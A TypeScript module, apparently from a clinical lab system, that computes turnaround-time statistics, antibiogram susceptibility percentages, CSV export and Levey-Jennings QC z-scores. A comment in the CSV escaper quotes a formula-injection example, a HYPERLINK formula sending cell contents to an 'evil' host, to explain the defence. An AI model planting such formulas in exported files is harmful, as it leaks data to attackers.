/**
 * 통계·리포트 집계 (Domain, 순수 함수) — TAT·antibiogram·QC 차트.
 * 근거: 기획 22 §6-5(인증 필수 지표: TAT·EQA·antibiogram).
 *
 * @author 신현묵 <8508132+seanshin@users.noreply.github.com>
 */

/** 정렬된 배열에서 백분위값(선형보간). */
export function percentile(sortedAsc: number[], p: number): number {
  if (sortedAsc.length === 0) return 0;
  if (sortedAsc.length === 1) return sortedAsc[0];
  const rank = (p / 100) * (sortedAsc.length - 1);
  const lo = Math.floor(rank);
  const hi = Math.ceil(rank);
  if (lo === hi) return sortedAsc[lo];
  return sortedAsc[lo] + (sortedAsc[hi] - sortedAsc[lo]) * (rank - lo);
}

export interface TatSummary {
  count: number;
  meanMin: number;
  medianMin: number;
  p90Min: number;
  buckets: { label: string; count: number }[];
}

/** TAT(분) 배열 요약 — 평균·중앙·p90 + 시간대 버킷. */
export function summarizeTat(minutes: number[]): TatSummary {
  const vals = minutes.filter((m) => Number.isFinite(m) && m >= 0).sort((a, b) => a - b);
  const n = vals.length;
  const mean = n ? vals.reduce((s, v) => s + v, 0) / n : 0;
  const round = (x: number) => Math.round(x * 10) / 10;
  const bucketDefs: [string, (m: number) => boolean][] = [
    ['≤1h', (m) => m <= 60],
    ['1–2h', (m) => m > 60 && m <= 120],
    ['2–4h', (m) => m > 120 && m <= 240],
    ['4–8h', (m) => m > 240 && m <= 480],
    ['>8h', (m) => m > 480],
  ];
  return {
    count: n,
    meanMin: round(mean),
    medianMin: round(percentile(vals, 50)),
    p90Min: round(percentile(vals, 90)),
    buckets: bucketDefs.map(([label, fn]) => ({ label, count: vals.filter(fn).length })),
  };
}

export interface AntibiogramRow {
  organism: string;
  total: number; // 균주 수
  antibiotics: { antibiotic: string; tested: number; susceptible: number; pctS: number }[];
}

/**
 * 감수성 원자료 → antibiogram 집계.
 * organism × antibiotic 별 %S = S / (S+I+R 판정건). 판정 없는 건 제외.
 */
export function antibiogramFrom(
  rows: { organism: string | null; antibiotic: string | null; interpretation: string | null }[],
): AntibiogramRow[] {
  const orgMap = new Map<string, Map<string, { tested: number; s: number }>>();
  for (const r of rows) {
    const org = (r.organism ?? '').trim();
    const abx = (r.antibiotic ?? '').trim();
    const interp = (r.interpretation ?? '').trim().toUpperCase();
    if (!org || !abx || !['S', 'I', 'R'].includes(interp)) continue;
    if (!orgMap.has(org)) orgMap.set(org, new Map());
    const am = orgMap.get(org)!;
    if (!am.has(abx)) am.set(abx, { tested: 0, s: 0 });
    const cell = am.get(abx)!;
    cell.tested += 1;
    if (interp === 'S') cell.s += 1;
  }
  const out: AntibiogramRow[] = [];
  for (const [organism, am] of orgMap) {
    const antibiotics = [...am.entries()]
      .map(([antibiotic, c]) => ({
        antibiotic,
        tested: c.tested,
        susceptible: c.s,
        pctS: c.tested ? Math.round((c.s / c.tested) * 1000) / 10 : 0,
      }))
      .sort((a, b) => a.antibiotic.localeCompare(b.antibiotic));
    const total = antibiotics.reduce((mx, a) => Math.max(mx, a.tested), 0);
    out.push({ organism, total, antibiotics });
  }
  return out.sort((a, b) => b.total - a.total);
}

/** antibiogram → CSV 문자열(organism,antibiotic,tested,susceptible,%S). */
export function antibiogramCsv(rows: AntibiogramRow[]): string {
  const lines = ['organism,antibiotic,tested,susceptible,pctS'];
  for (const r of rows) {
    for (const a of r.antibiotics) {
      lines.push(`${csv(r.organism)},${csv(a.antibiotic)},${a.tested},${a.susceptible},${a.pctS}`);
    }
  }
  return lines.join('\n');
}

/**
 * CSV 셀 이스케이프. RFC-4180 인용에 더해 **수식 인젝션**을 막는다 —
 * `=`/`+`/`-`/`@`/탭/CR로 시작하는 셀은 Excel·Sheets가 수식으로 실행하므로(예:
 * `=HYPERLINK("http://evil/?d="&A1)`) 작은따옴표를 앞에 붙여 텍스트로 고정한다.
 * 균명 등 자유 텍스트가 그대로 셀이 되는 경로가 있어 출력 계층에서 처리한다.
 */
function csv(s: string): string {
  const v = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
}

/** QC 측정값 → Levey-Jennings 포인트(z-score). */
export function ljPoints(
  points: { measuredDt: string | null; value: number }[],
  mean: number,
  sd: number,
): { at: string | null; value: number; z: number }[] {
  return points.map((p) => ({
    at: p.measuredDt,
    value: p.value,
    z: sd ? Math.round(((p.value - mean) / sd) * 100) / 100 : 0,
  }));
}
